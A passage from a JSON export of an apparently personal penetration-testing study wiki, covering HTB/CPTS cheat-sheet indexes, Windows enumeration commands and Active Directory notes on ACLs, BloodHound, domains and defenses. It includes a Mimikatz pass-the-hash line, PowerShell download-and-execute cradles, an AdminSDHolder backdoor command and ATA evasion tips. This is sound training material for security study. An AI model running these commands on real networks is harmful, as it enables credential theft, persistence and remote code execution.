    "content": "## AD Check List \n\n|                                      |     |\n| ------------------------------------ | --- |\n| Domain User                          |     |\n| Group                                |     |\n| Group Policy                         |     |\n| Password Policy                      |     |\n| ACLs                                 |     |\n| Computers                            |     |\n| Windows Defender                     |     |\n| AppLocker                            |     |\n| PowerShell Constrained Language Mode |     |\n| LAPS                                 |     |\n| LLMNR/NBT-NS Poisoning               |     |\n| sniffer.exe                          |     |\n| Hotfixes                             |     |\n| Systeminfo                           |     |\n| Get-ExecutionPolicy -List            |     |\n| Firewall Checks                      |     |\n| Windows Defender Check               |     |\n| Retrieving the AS-REP Using Kerbrute |     |\n## Windows\n\n|                                                 |                                                                                                                                        |\n| ----------------------------------------------- | -------------------------------------------------------------------------------------------------------------------------------------- |\n| Interface(s), IP Address(es), DNS Information   | `arp -a`, `ifconfig /all`, `route print`                                                                                               |\n| username and hostname                           | `$env:username `, `$env:comptername`                                                                                                   |\n| check Windows Defender Status                   | ```powershell-session<br>Get-MpComputerStatus<br>```                                                                                   |\n| List AppLocker Rules                            | ```powershell-session<br>Get-AppLockerPolicy -Effective \\| select -ExpandProperty RuleCollections<br>```                               |\n| Test AppLocker Policy                           | ```powershell-session Get-AppLockerPolicy -Local \\| Test-AppLockerPolicy -path C:\\Windows\\System32\\cmd.exe -User Everyone```           |\n| System Information                              | OS Version                                                                                                                             |\n| Tasklist                                        | ```<br>tasklist /svc<br>```                                                                                                            |\n| Display All Environment Variables               | `set`                                                                                                                                  |\n| View Detailed Configuration Information         | systeminfo                                                                                                                             |\n| Patches and Updates                             | ```<br>wmic qfe<br>```<br><br>```powershell-session<br>Get-HotFix \\| ft -AutoSize<br>```<br>                                           |\n| Installed Programs                              | ```<br>wmic product get name<br>```<br><br>```powershell-session<br>Get-WmiObject -Class Win32_Product \\|  select Name, Version<br>``` |\n| Display Running Processes                       | ```<br>netstat -ano<br>```<br><br>```<br>tasklist /svc /fi \"PID eq 2324\"<br>```                                                        |\n| **User & Group Information**                    |                                                                                                                                        |\n| Logged-In Users                                 | ```<br>query user<br>```                                                                                                               |\n| Current User                                    | ```<br>echo %USERNAME%<br>```                                                                                                          |\n| Current User Privileges                         | ```<br>whoami /priv<br>```                                                                                                             |\n| Current User Group Information                  | ```<br>whoami /groups<br>```                                                                                                           |\n| Get All Users                                   | ```<br> net user<br>```                                                                                                                |\n| Get All Groups                                  | ```<br>net localgroup<br>```                                                                                                           |\n| Details About a Group                           | ```<br>net localgroup administrators<br>```                                                                                            |\n| Get Password Policy & Other Account Information | ```<br>net accounts<br>```                                                                                                             |\n|                                                 |                                                                                                                                        |\n",
    "frontmatter": {}
  },
  {
    "slug": "README",
    "path": "README.md",
    "title": "README",
    "tags": [],
    "date": "2025-09-17",
    "excerpt": "Cheet Sheet | Sl.No |                                        |                                                                                                                                          ...",
    "category": "General",
    "content": "## Cheet Sheet\n\n| Sl.No |                                        |                                                                                                                                                                                                                                                                                                        |\n| ----- | -------------------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ |\n| 01    | Network Enumeration - (Nmap)           | [01-Cheet Sheet Network Enumeration](02_CPTS/02_Network%20Enumeration%20with%20Nmap/01-Cheet%20Sheet%20Network%20Enumeration.md)                                                                                                                                                                       |\n| 02    | Footprinting Network - (Common Ports)  | [01- Cheet sheet Footprinting](02_CPTS/03-Footprinting/01-%20Cheet%20sheet%20Footprinting.md)                                                                                                                                                                                                          |\n| 03    | Infromation Gathering - WEB            | [01-Cheet sheet  web Information Gathering](02_CPTS/04-Information%20Gathering%20-%20Web%20Edition/01-Cheet%20sheet%20%20web%20Information%20Gathering.md)                                                                                                                                             |\n| 04    | File Transfer - (Windows & Linux)      | [01-Cheet Sheet File Transfer](02_CPTS/06-File%20Transfers/01-Cheet%20Sheet%20File%20Transfer.md)                                                                                                                                                                                                      |\n| 05    | Shells & Payloads                      | [01-Cheet Sheet Shells & Payloads](02_CPTS/07-Shells%20&%20Payloads/01-Cheet%20Sheet%20Shells%20&%20Payloads.md)                                                                                                                                                                                       |\n| 06    | Metasploit                             | [01-Cheet Sheet Metasploit](02_CPTS/08-Metasploit/01-Cheet%20Sheet%20Metasploit.md)                                                                                                                                                                                                                    |\n| 07    | Password Attacks                       | [00-CheetSheet Password Attacks](02_CPTS/09-Password%20Attacks/00-CheetSheet%20Password%20Attacks.md)                                                                                                                                                                                                  |\n| 08    | Attacking Common Services              | [01- Cheet Sheet Attacking Common Services](02_CPTS/10-Attacking%20Common%20Services/01-%20Cheet%20Sheet%20Attacking%20Common%20Services.md) \\| [Users List](https://academy.hackthebox.com/storage/resources/users.zip)  \\| [Password list](https://academy.hackthebox.com/storage/resources/pws.zip) |\n| 09    | Pivoting or Tunneling                  | [01- Cheet Sheet Tunneling](02_CPTS/11-Pivoting,%20Tunneling,%20and%20Port%20Forwarding/01-%20Cheet%20Sheet%20Tunneling.md)                                                                                                                                                                            |\n| 10    | Active Directory Enumeration & Attacks | [01-Cheet Sheet AD Enumeration & Attacks](02_CPTS/12-Active%20Directory%20Enumeration%20&%20Attacks/01-Cheet%20Sheet%20AD%20Enumeration%20&%20Attacks.md) /                                                                                                                                            |\n| 11    | Using Web Proxies                      | [01-Cheet Sheet Web Proxies](02_CPTS/13-Using%20Web%20Proxies/01-Cheet%20Sheet%20Web%20Proxies.md)                                                                                                                                                                                                     |\n| 12    | Attacking Web Application              | [01- Cheet Sheet FFUF](02_CPTS/14-Attacking%20Web%20Application%20With%20FFuf/01-%20Cheet%20Sheet%20FFUF.md)                                                                                                                                                                                           |\n| 13    | Login Bruteforce                       | [01-Cheat Sheet Login Brute Forcing](02_CPTS/15-login%20Bruteforce/01-Cheat%20Sheet%20Login%20Brute%20Forcing.md)                                                                                                                                                                                      |\n| 14    | linux Privilege Escalation             | [01- Cheet Sheet Linux Privilege Escalation](02_CPTS/16-Linux%20Privilege%20Escalation/01-%20Cheet%20Sheet%20Linux%20Privilege%20Escalation.md)                                                                                                                                                        |\n| 15    | Windows Privilege Escalation           | [00-Cheet Sheet Windows Privilege Escalation](02_CPTS/17-Windows%20Privilege%20Escalation/00-Cheet%20Sheet%20Windows%20Privilege%20Escalation.md)                                                                                                                                                      |\n\n\n## AD Tools \n- [03-Tools of the Trade - Linux ](02_CPTS/12-Active%20Directory%20Enumeration%20&%20Attacks/03-Tools%20of%20the%20Trade.md)\n- [02-Useful Tools - Windows](02_CPTS/17-Windows%20Privilege%20Escalation/02-Useful%20Tools.md)\n## Wordlists\n\n- [statistically-likely-usernames(Kerbrosting )](https://github.com/insidetrust/statistically-likely-usernames)\n\nHere is a table of some of the more useful wordlists for login brute-forcing:\n\n| Wordlist                                    | Description                                                                                      | Typical Use                                        | Source                                                                                                                           |\n| ------------------------------------------- | ------------------------------------------------------------------------------------------------ | -------------------------------------------------- | -------------------------------------------------------------------------------------------------------------------------------- |\n| `rockyou.txt`                               | A popular password wordlist containing millions of passwords leaked from the RockYou breach.     | Commonly used for password brute force attacks.    | [RockYou breach dataset](https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt)                      |\n| `top-usernames-shortlist.txt`               | A concise list of the most common usernames.                                                     | Suitable for quick brute force username attempts.  | [SecLists](https://github.com/danielmiessler/SecLists/blob/master/Usernames/top-usernames-shortlist.txt)                         |\n| `xato-net-10-million-usernames.txt`         | A more extensive list of 10 million usernames.                                                   | Used for thorough username brute forcing.          | [SecLists](https://github.com/danielmiessler/SecLists/blob/master/Usernames/xato-net-10-million-usernames.txt)                   |\n| `2023-200_most_used_passwords.txt`          | A list of the 200 most commonly used passwords as of 2023.                                       | Effective for targeting commonly reused passwords. | [SecLists](https://github.com/danielmiessler/SecLists/blob/master/Passwords/Common-Credentials/2023-200_most_used_passwords.txt) |\n| `Default-Credentials/default-passwords.txt` | A list of default usernames and passwords commonly used in routers, software, and other devices. | Ideal for trying default credentials.              | [SecLists](https://github.com/danielmiessler/SecLists/blob/master/Passwords/Default-Credentials/default-passwords.txt)           |\n\n## Nmap - sort result\n```shell-session\negrep -v \"^#|Status: Up\" inlanefreight_ept_tcp_all_svc.gnmap | cut -d ' ' -f4- | tr ',' '\\n' | sed -e 's/^[ \\t]*//' | awk -F '/' '{print $7}' | grep -v \"^$\" | sort | uniq -c | sort -k 1 -nr\n```\n\n### PS Remoting\n\n```\n$NewPassword = ConvertTo-SecureString \"NewP@ssw0rd!\" -AsPlainText -Force \nSet-LocalUser -Name \"UserName\" -Password $NewPassword\n```\n\n\n### Restart \n```\nshutdown.exe /r /t 0 /f\n```\n\n\n```\nInvoke-Mimikatz -Command '\"sekurlsa::pth /user:Administrator /domain:inlanefreight.local /ntlm:27dedb1dab4d8545c6e1c66fba077da0 /run:powershell.exe\"'\n```\n\n\n```\npowershell -nop -c \"iex(New-Object Net.WebClient).DownloadString('URL to download the file from'); <follow-on commands>\"\n```\n",
    "frontmatter": {}
  },
  {
    "slug": "SUMMARY",
    "path": "SUMMARY.md",
    "title": "SUMMARY",
    "tags": [],
    "date": "2025-09-17",
    "excerpt": "Table of Contents - Bufu-Sec Wiki Active Directory - General     - General     - Installation     - DNS     - Kerberos     - Kerberos Delegation - Enumeration     - AD Module     - Bloodhound     - Po...",
    "category": "General",
    "content": "# Table of Contents\n\n- [Bufu-Sec Wiki](README.md)\n\n## Active Directory\n\n- [General](active_directory/general/README.md)\n    - [General](active_directory/general/general.md)\n    - [Installation](active_directory/general/installation.md)\n    - [DNS](active_directory/general/dns.md)\n    - [Kerberos](active_directory/general/kerberos.md)\n    - [Kerberos Delegation](active_directory/general/kerberos_delegation.md)\n- [Enumeration](active_directory/enumeration/README.md)\n    - [AD Module](active_directory/enumeration/ad_module.md)\n    - [Bloodhound](active_directory/enumeration/bloodhound.md)\n    - [PowerShell Cheatsheet](active_directory/enumeration/powershell.md)\n    - [PowerView Cheatsheet](active_directory/enumeration/powerview.md)\n    - [Users](active_directory/enumeration/users.md)\n    - [Groups](active_directory/enumeration/groups.md)\n    - [Computers](active_directory/enumeration/computers.md)\n    - [OUs](active_directory/enumeration/ous.md)\n    - [GPOs](active_directory/enumeration/gpos.md)\n    - [ACLs](active_directory/enumeration/acls.md)\n    - [Domains](active_directory/enumeration/domains.md)\n    - [Trusts](active_directory/enumeration/trusts.md)\n    - [Forest Mappings](active_directory/enumeration/forest_mappings.md)\n    - [Files and Shares](active_directory/enumeration/files_and_shares.md)\n    - [Kerbrute](active_directory/enumeration/kerbrute.md)\n- [Privilege Escalation](active_directory/privilege_escalation/README.md)\n    - [Kerberoasting](active_directory/privilege_escalation/kerberoasting.md)\n    - [AS-REP Roasting](active_directory/privilege_escalation/as-rep_roasting.md)\n    - [Constrained Delegation](active_directory/privilege_escalation/constrained_delegation.md)\n    - [Unconstrained Delegation](active_directory/privilege_escalation/unconstrained_delegation.md)\n    - [DNS Admins](active_directory/privilege_escalation/dns_admins.md)\n- [Lateral Movement](active_directory/lateral_movement/README.md)\n    - [PS Remoting](active_directory/lateral_movement/ps_remoting.md)\n    - [Credential Dumping](active_directory/lateral_movement/credential_dumping.md)\n    - [DC Sync](active_directory/lateral_movement/dc_sync.md)\n    - [Overpass the Hash](active_directory/lateral_movement/overpass_the_hash.md)\n    - [Ticket Harvesting](active_directory/lateral_movement/ticket_harvesting.md)\n    - [Pass the Ticket](active_directory/lateral_movement/pass_the_ticket.md)\n- [Persistence](active_directory/persistence/README.md)\n    - [Golden Tickets](active_directory/persistence/golden_tickets.md)\n    - [Silver Tickets](active_directory/persistence/silver_tickets.md)\n    - [ACL Attacks](active_directory/persistence/acl_attacks.md)\n    - [Custom SSPs](active_directory/persistence/custom_ssps.md)\n    - [DC Shadow](active_directory/persistence/dc_shadow.md)\n    - [Skeleton Key](active_directory/persistence/skeleton_key.md)\n    - [DSRM](active_directory/persistence/dsrm.md)\n- [Trust Attacks](active_directory/trust_attacks/README.md)\n    - [Cross Domain Attacks](active_directory/trust_attacks/cross_domain_attacks.md)\n    - [Cross Forest Attacks](active_directory/trust_attacks/cross_forest_attacks.md)\n    - [MSSQL Servers](active_directory/trust_attacks/mssql_servers.md)\n- [MITM & Relay Attacks](active_directory/mitm_relay/README.md)\n    - [LLMNR Poisoning](active_directory/mitm_relay/llmnr_poisoning.md)\n    - [SMB Relay](active_directory/mitm_relay/smb_relay.md)\n    - [IPv6 Attacks](active_directory/mitm_relay/ipv6_attacks.md)\n- [Detection & Defense](active_directory/detection_and_defense/README.md)\n    - [Domain Admins](active_directory/detection_and_defense/domain_admins.md)\n    - [Architectural Changes](active_directory/detection_and_defense/architectural_changes.md)\n    - [Microsoft ATA](active_directory/detection_and_defense/microsoft_ata.md)\n",
    "frontmatter": {}
  },
  {
    "slug": "active_directory/detection_and_defense/README",
    "path": "active_directory/detection_and_defense/README.md",
    "title": "README",
    "tags": [],
    "date": "2025-09-17",
    "excerpt": "Detection and Defense",
    "category": "active_directory",
    "content": "# Detection and Defense\n",
    "frontmatter": {}
  },
  {
    "slug": "active_directory/detection_and_defense/architectural_changes",
    "path": "active_directory/detection_and_defense/architectural_changes.md",
    "title": "Architectural_changes",
    "tags": [],
    "date": "2025-09-17",
    "excerpt": "Architectural Changes LAPS - Local Administrator Password Solution - Centralized storage of passwords in AD with periodic randomizing where read permissions are access controlled - Computer objects ha...",
    "category": "active_directory",
    "content": "# Architectural Changes\n\n## LAPS - Local Administrator Password Solution\n\n- Centralized storage of passwords in AD with periodic randomizing where read permissions are access controlled\n- Computer objects have two new attributes ms mcs AdmPwd attribute stores the clear text password and ms mcs AdmPwdExpirationTime controls the password change\n- Storage in clear text, transmission is encrypted\n- With careful enumeration, it is possible to retrieve which users can access the clear text password providing a list of attractive targets!\n\n## Credential Guard\n\n- Now called, Windows Defender Credential Guard, it \"uses virtualization based security to isolate secrets so that only privileges system software can access them\"\n- Effective in stopping PTH and Over PTH attacks by restricting access to NTLM hashes and TGTs\n- As of Windows 10 1709, it is not possible to write Kerberos tickets to memory even if we have credentials.\n- https://docs.microsoft.com/en-us/windows/access-protection/credential-guard/credential-guard\n- Credentials for local accounts in SAM and Service account credentials from LSA secrets are NOT protected\n- Credential Guard cannot be enabled on a domain contorller as it breaks authentication there\n- Only available on the Windows 10 Enterprise edition and Server 2016\n- Possible to replay service account credenttials for lateral movement even if credential guard is enabled\n\n## Device Guard\n\n- Now called, Windows Defender Device Guard, it is a group of features \"designed to harden a system against malware attacks. Its focus is preventing malicious code from running by ensuring only known good code can run.\"\n- Three primary components:\n  - Configurable Code Integrity (CCI) Configure only trusted code to run\n  - Virtual Secure Mode Protected Code Integirty Enforces CCI with Kernerl Mode (KMCI) and User Mode (UMCI)\n  - Platform and UEFI Secure Boot Ensures boot binaries and firmware integrity\n- https://docs.microsoft.com/en-us/windows/security/threat-protection/device-guard/introduction-to-device-guard-virtualization-based-security-and-windows-defender-application-control\n- UMCI is something which interferes with most of the lateral movement attacks we have seen\n- While it depends on the deployment (discussing which will be too lengthy), many well known application whitelisting bypasses signed binaries like csc.exe, MSBuild.exe etc. are useful for bypassing UMCI as well\n\n## Protected Users Group\n\n- Introduced in Server 2012 R2 for \"better protection against credential theft\" by not caching credentials in insecure ways\n- A user added to this group:\n  - Cannot use CredSSP and WDigest No more cleartext credentials caching\n  - NTLM hash is not cached\n  - Kerberos does not use DES or RC4 keys. No caching of clear text cred or long term keys.\n- If the domain functional level is Server 2012 R2:\n  - No NTLM authentication\n    No DES or RC4 keys in Kerberos pre auth\n  - No delegation (constrained or unconstrained)\n  - No renewal of TGT beyond initial for hour lifetime Hardcoded, unconfigurable \"Maximum lifetime for user ticket\" and \"Maximum lifetime for user ticket\n- Needs all domain control to be at least Server 2008 or later (because AES keys)\n- Not recommended by MS to add DAs and EAs to this group without testing \"the potential impact\" of lock out\n- No cached logon ie.e no offline sign on\n- Having computer and service accounts in this group is useless as their credentials will always be present on the host machine\n\n## Privileged Administrative Workstations (PAWs)\n\n- A hardened workstation for performing sensitive tasks like\n  - administration of domain controllers\n  - cloud infrastructure\n  - sensitive business functions etc.\n- Can provide protection from\n  - phishing attacks\n  - OS vulnerabilities\n  - credential replay attacks\n- Admin Jump servers to be accessed only from a PAW, multiple strategies\n  - Separate privilege and hardware for administrative and normal tasks\n  - Having a VM on a PAW for user tasks\n\n## Active Directory Administrative Tier Model\n\n- Composed of three levels only for administrative accounts\n- Control restrictions: what admins control\n- Logon restrictions: where admins can log-on to\n\n### Tier 0\n\nAccounts, Groups and computers which have privileges across the enterprise like domain controllers, domain admins, enterprise admins\n\n### Tier 1\n\n- Accounts, Groups and computers which have access to resources having significant amount of business value\n- A common example role is server administrators who maintain these operating systems with the ability to impact all enterprise services\n\n### Tier 2\n\n- Administrator accounts which have administrative control of a significant amount of business value that is hosted on user workstations and devices\n- Examples include Help Desk and computer support administrators because they can impact the integrity of almost any user data\n\n## ESAE (Enhanced Security Admin Environment)\n\n- Dedicated administrative forest for managing critical assets like\n  - administrative users\n  - groups\n  - computers\n- Since a forest is considered a security boundary rather than a domain, this model provides enhanced security controls\n- The administrative forest is also called the Red Forest\n- Administrative users in a production forest are used as standard non privileged users in the administrative forest\n- Selective Authentication to the Red Forest enables stricter security controls on logon of users from non-administrative forests\n\n## Further Reading\n\n- [Securing Privileged Access](https://docs.microsoft.com/en-us/security/compass/overview)\n- [Best Practices for Securing Active Directory](https://docs.microsoft.com/en-us/windows-server/identity/ad-ds/plan/security-best-practices/best-practices-for-securing-active-directory)\n",
    "frontmatter": {}
  },
  {
    "slug": "active_directory/detection_and_defense/domain_admins",
    "path": "active_directory/detection_and_defense/domain_admins.md",
    "title": "Domain_admins",
    "tags": [],
    "date": "2025-09-17",
    "excerpt": "Domain Admins General Mitigations - Do not allow or limit login of DAs to any other machine other than the Domain Controllers - If logins to some servers are necesarry, do not allow other administrato...",
    "category": "active_directory",
    "content": "# Domain Admins\n\n## General Mitigations\n\n- Do not allow or limit login of DAs to any other machine other than the Domain Controllers\n- If logins to some servers are necesarry, do not allow other administrators to login to that machine\n- Never run a service with Domain Admin privileges as it makes many credential theft protections useless in case of a service account\n\n## Temporary Group Membership\n\n- Temporarily add user to a group\n- Requires `Privileged Access Management` Feature to be enabled which can't be turned off later\n\n```powershell\nAdd-ADGroupMember -Identity 'Domain Admins' -Members newDA -MemberTimeToLive (New-TimeSpan -Minutes 20)\n```\n",
    "frontmatter": {}
  },
  {
    "slug": "active_directory/detection_and_defense/microsoft_ata",
    "path": "active_directory/detection_and_defense/microsoft_ata.md",
    "title": "Microsoft_ata",
    "tags": [],
    "date": "2025-09-17",
    "excerpt": "Microsoft ATA General - Traffic destined for Domain Controllers is mirrored to ATA sensors - Use activity profile is build over time, i.e.   - use of computers   - credentials   - log on machines - Co...",
    "category": "active_directory",
    "content": "# Microsoft ATA\n\n## General\n\n- Traffic destined for Domain Controllers is mirrored to ATA sensors\n- Use activity profile is build over time, i.e.\n  - use of computers\n  - credentials\n  - log on machines\n- Collects Event 4776 (The DC attempted to validate the credentials for an account) to detect credential replay attacks\n- Can detect behavioral anomalies\n- Useful for detecting:\n  - Recon: account enum, netsession enum\n  - Compromised Credentials Attacks: bruteforce, high privilege account/service account exposed in clear text, honey token, unusual protocol (NTLM and Kerberos)\n  - Credential/Hash/Ticket Replay attacks\n\n## Bypassing ATA\n\n- Avoid talking to the DC as long as possible\n- Try to blend in with normal traffic\n",
    "frontmatter": {}
  },
  {
    "slug": "active_directory/enumeration/README",
    "path": "active_directory/enumeration/README.md",
    "title": "README",
    "tags": [],
    "date": "2025-09-17",
    "excerpt": "Enumeration",
    "category": "active_directory",
    "content": "# Enumeration\n",
    "frontmatter": {}
  },
  {
    "slug": "active_directory/enumeration/acls",
    "path": "active_directory/enumeration/acls.md",
    "title": "Acls",
    "tags": [],
    "date": "2025-09-17",
    "excerpt": "Domain ACL General - Access Control Entries (ACE) correspond to individual permission or audits access - Who has permission and what can be done on an object? - Two types:   - DACL -> Defines the perm...",
    "category": "active_directory",
    "content": "# Domain ACL\n\n## General\n\n- Access Control Entries (ACE) correspond to individual permission or audits access\n- Who has permission and what can be done on an object?\n- Two types:\n  - DACL -> Defines the permissions trustees (a user or group) have on an object\n  - SACL - Logs success and failure audit messages when an object is accessed\n\n## Enumerate ACLs without Resolving GUIDs\n\n```powershell\n# AD Module\n(Get-ACL 'CN=Domain Admins,CN=Users,DC=dc01,DC=dc02,DC=local').Access\n```\n\n## Get the ACLs Associated with the Specified Object\n\n```powershell\n# PowerView\nGet-ObjectACL -SamAccountName \"Users\" -ResolveGUIDs\n```\n\n## Get the ACLs Associated with the Specified Prefix to Be Used for Search\n\n```powershell\n# PowerView\nGet-ObjectACL -ADSPrefix 'CN=Administrator,CN=Users' -Verbose\n```\n\n## Get the ACLs Associated with the Specified LDAP Path to Be Used for Search\n\n```powershell\n# PowerView\nGet-ObjectACL -ADSPath \"LDAP://CN=Domain Admins,CN=Users,DC=dc01,DC=dc02,DC=local\" -ResolveGUIDs -Verbose\n```\n\n## Search for Interesting ACEs\n\n```powershell\n# PowerView\nInvoke-ACLScanner -ResolveGUIDs\n```\n\n## Get the ACLs Associated with the Specified Path\n\n```powershell\n# PowerView\nGet-PathACL -Path \"\\\\dc01.lab.local\\sysvol\"\n```\n\n## Enumerate Who Has Rights to the 'matt' User in 'testlab.local', Resolving Rights GUIDs to Names\n\n```powershell\n# PowerView\nGet-DomainObjectAcl -Identity matt -ResolveGUIDs -Domain testlab.local\n```\n\n## Grant User 'will' the Rights to Change 'matt's Password\n\n```powershell\n# PowerView\nAdd-DomainObjectAcl -TargetIdentity matt -PrincipalIdentity will -Rights ResetPassword -Verbose\n```\n\n## Audit the Permissions of AdminSDHolder, Resolving GUIDs\n\n```powershell\n# PowerView\nGet-DomainObjectAcl -SearchBase 'CN=AdminSDHolder,CN=System,DC=testlab,DC=local' -ResolveGUIDs\n```\n\n## Backdoor the ACLs of All Privileged Accounts with the 'matt' Account through AdminSDHolder Abuse\n\n```powershell\n# PowerView\nAdd-DomainObjectAcl -TargetIdentity 'CN=AdminSDHolder,CN=System,DC=testlab,DC=local' -PrincipalIdentity matt -Rights All\n```\n\n## Retrieve *most* Users Who Can Perform DC Replication for dev.testlab.local (i.e. DCsync)\n\n```powershell\n# PowerView\nGet-DomainObjectAcl \"dc=dev,dc=testlab,dc=local\" -ResolveGUIDs | ? {\n    ($_.ObjectType -match 'replication-get') -or ($_.ActiveDirectoryRights -match 'GenericAll')\n}\n```\n\n## Enumerate Permissions for GPOs where Users with RIDs of > -1000 Have Some Kind of Modification/Control Rights\n\n```powershell\n# PowerView\nGet-DomainObjectAcl -LDAPFilter '(objectCategory=groupPolicyContainer)' | ? { ($_.SecurityIdentifier -match '^S-1-5-.*-[1-9]\\d{3,}$') -and ($_.ActiveDirectoryRights -match 'WriteProperty|GenericAll|GenericWrite|WriteDacl|WriteOwner')}\n```\n",
    "frontmatter": {}
  },
  {
    "slug": "active_directory/enumeration/ad_module",
    "path": "active_directory/enumeration/ad_module.md",
    "title": "Ad_module",
    "tags": [],
    "date": "2025-09-17",
    "excerpt": "AD Module Setup With Internet Access `powershell iex (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/samratashok/ADModule/master/Import-ActiveDirectory.ps1');Import-Active...",
    "category": "active_directory",
    "content": "# AD Module\n\n## Setup\n\n### With Internet Access\n\n```powershell\niex (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/samratashok/ADModule/master/Import-ActiveDirectory.ps1');Import-ActiveDirectory\n```\n\n### Without Internet Access\n\n```powershell\n# If computer has no internet access, download repository\nImport-Module .\\ADModule\\Microsoft.ActiveDirectory.Management.dll -Verbose\nImport-Module .\\ADModule\\ActiveDirectory\\ActiveDirectory.psd1\n```\n\n### Check if Module Has Been Imported Correctly\n\n```powershell\nGet-Command -Module ActiveDirectory\n```\n",
    "frontmatter": {}
  },
  {
    "slug": "active_directory/enumeration/bloodhound",
    "path": "active_directory/enumeration/bloodhound.md",
    "title": "Bloodhound",
    "tags": [],
    "date": "2025-09-17",
    "excerpt": "Bloodhound Setup `bash Install bloodhound apt install bloodhound Start console neo4j console Open web console and login with default credentials: neo4j:neo4j firefox http://localhost:7474/browser/ Sta...",
    "category": "active_directory",
    "content": "# Bloodhound\n\n## Setup\n\n```bash\n# Install bloodhound\napt install bloodhound\n\n# Start console\nneo4j console\n\n# Open web console and login with default credentials: neo4j:neo4j\nfirefox http://localhost:7474/browser/\n\n# Start bloodhound and login with credentials\nbloodhound\n```\n\n## Get Loot with SharpHound.ps1\n\n```powershell\n# Default\nInvoke-Bloodhound -CollectionMethod All -Domain CONTROLLER.local -ZipFileName loot.zip\n\n# Try to avoid detection\nInvoke-Bloodhound -CollectionMethod All -Domain CONTROLLER.local -ZipFileName loot.zip -ExcludeDC\n```\n",
    "frontmatter": {}
  },
  {
    "slug": "active_directory/enumeration/computers",
    "path": "active_directory/enumeration/computers.md",
    "title": "Computers",
    "tags": [],
    "date": "2025-09-17",
    "excerpt": "Domain Computers Get List of Computers in Current Domain `powershell AD Module Get-ADComputer -Filter  -Properties  Get-ADComputer -Filter * | Select Name PowerView Get-NetComputer Get-NetComputer -Fu...",
    "category": "active_directory",
    "content": "# Domain Computers\n\n## Get List of Computers in Current Domain\n\n```powershell\n# AD Module\nGet-ADComputer -Filter * -Properties *\nGet-ADComputer -Filter * | Select Name\n\n# PowerView\nGet-NetComputer\nGet-NetComputer -FullData\n```\n\n## Check for Live Hosts (depends on ICMP)\n\n```powershell\n# AD Module\nGet-ADComputer -Filter * -Properties DNSHostName | %{Test-Connection -Count 1 -ComputerName $_.DNSHostName}\n\n# PowerView\nGet-NetComputer -Ping\n```\n\n## Information about Operating Systems\n\n```powershell\n# AD Module\nGet-ADComputer -Filter 'OperatingSystem -Like \"*Server 2016\"' -Properties OperatingSystem | Select Name,OperatingSystem\n\n# PowerView\nGet-NetComputer -OperatingSystem \"*Server 2016\"\nGet-NetComputer -FullData | select dnshostname,operatingsystem\n```\n\n## Get List of Sessions on Computer\n\n```powershell\n# PowerView\nGet-NetSession -ComputerName \"dc01.lab.local\"\n```\n\n## Find Any Computers with Constrained Delegation Set\n\n```powershell\n# PowerView\nGet-DomainComputer -TrustedToAuth\n```\n\n## Find All Servers that Allow Unconstrained Delegation\n\n```powershell\n# PowerView\nGet-DomainComputer -Unconstrained\n```\n\n## Return the Local Groups of a Remote Server\n\n```powershell\n# PowerView\nGet-NetLocalGroup SERVER.domain.local\n```\n\n## Return the Local Group Members of a Remote Server Using Win32 API Methods (faster but less info)\n\n```powershell\n# PowerView\nGet-NetLocalGroupMember -Method API -ComputerName SERVER.domain.local\n```\n\n## Enumerates Computers in the Current Domain with 'outlier' Properties\n\n```powershell\n# PowerView\nGet-DomainComputer -FindOne | Find-DomainObjectPropertyOutlier\n```\n",
    "frontmatter": {}
  },
  {
    "slug": "active_directory/enumeration/domains",
    "path": "active_directory/enumeration/domains.md",
    "title": "Domains",
    "tags": [],
    "date": "2025-09-17",
    "excerpt": "Domains Get Current Domain `powershell AD Module Get-ADDomain PowerView Get-NetDomain ` Get Object of Another Domain `powershell AD Module Get-ADDomain -Identity lab.local PowerView Get-NetDomain -Dom...",
    "category": "active_directory",
    "content": "# Domains\n\n## Get Current Domain\n\n```powershell\n# AD Module\nGet-ADDomain\n\n# PowerView\nGet-NetDomain\n```\n\n## Get Object of Another Domain\n\n```powershell\n# AD Module\nGet-ADDomain -Identity lab.local\n\n# PowerView\nGet-NetDomain -Domain lab.local\n```\n\n## Get Domain SID for Current Domain\n\n```powershell\n# AD Module\n(Get-ADDomain).DomainSID\n\n# PowerView\nGet-DomainSID\n```\n\n## Get Domain Policy for Current Domain\n\n```powershell\n# PowerView\nGet-DomainPolicy\n(Get-DomainPolicy).\"System Access\"\n```\n\n## Get Password Policy for Another Domain\n\n```powershell\n# PowerView\n(Get-DomainPolicy -Domain lab.local).\"System Access\"\n```\n\n## Get Kerberos Policy for e.g. Mimikatz Golden Tickets\n\n```powershell\n# PowerView\n(Get-DomainPolicy -Domain lab.local).\"Kerberos Policy\"\n```\n\n## Get Domain Controllers for Current Domain\n\n```powershell\n# AD Module\nGet-ADDomainController\n\n# PowerView\nGet-NetDomainController\n```\n\n## Get Domain Controllers for Another Domain\n\n```powershell\n# AD Module\nGet-ADDomainController -DomainName lab.local -Discover\n\n# PowerView\nGet-NetDomainController -Domain lab.local\n```\n\n## Enumerate All Gobal Catalogs in the Forest\n\n```powershell\n# PowerView\nGet-ForestGlobalCatalog\n```\n\n## Turn a List of Computer Short Names to FQDNs, Using a Global Catalog\n\n```powershell\n# PowerView\ngc computers.txt | % {Get-DomainComputer -SearchBase \"GC://GLOBAL.CATALOG\" -LDAP \"(name=$_)\" -Properties dnshostname}\n```\n\n## Enumerate the Current Domain Controller Policy\n\n```powershell\n# PowerView\n$DCPolicy = Get-DomainPolicy -Policy DC\n$DCPolicy.PrivilegeRights # user privilege rights on the dc...\n```\n\n## Enumerate the Current Domain Policy\n\n```powershell\n# PowerView\n$DomainPolicy = Get-DomainPolicy -Domain bufu-sec.local\n$DomainPolicy.KerberosPolicy # useful for golden tickets ;)\n$DomainPolicy.SystemAccess # password age/etc.\n```\n",
    "frontmatter": {}
  },
  {
    "slug": "active_directory/enumeration/files_and_shares",
    "path": "active_directory/enumeration/files_and_shares.md",
    "title": "Files_and_shares",
    "tags": [],
    "date": "2025-09-17",
    "excerpt": "Files and Shares Find Shares on Hosts in Current Domain `powershell Invoke-ShareFinder -Verbose ` Find Shares from other Domain `powershell Invoke-ShareFinder -Domain lab.local ` Exclude Default Share...",
    "category": "active_directory",
